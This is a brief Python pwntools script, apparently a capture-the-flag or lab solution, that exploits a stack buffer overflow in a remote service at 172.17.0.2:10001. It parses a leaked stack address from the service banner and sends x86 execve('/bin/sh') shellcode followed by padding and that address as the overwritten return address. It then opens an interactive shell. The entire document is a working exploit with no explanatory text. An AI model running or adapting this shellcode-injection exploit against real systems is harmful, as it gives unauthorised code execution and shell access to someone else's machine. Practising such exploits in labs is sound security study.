from pwn import process, remote
import struct
import sys

execbinsh = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'

#target = process('./one.o')
target = remote("172.17.0.2", 10001)

addr = int(target.recvuntil("shell!").split()[5].decode("utf-8"), 16)

padding = b'\x41' * (68 - len(execbinsh))
payload = execbinsh + padding + struct.pack("<L", addr)

target.sendline(payload)
target.interactive()
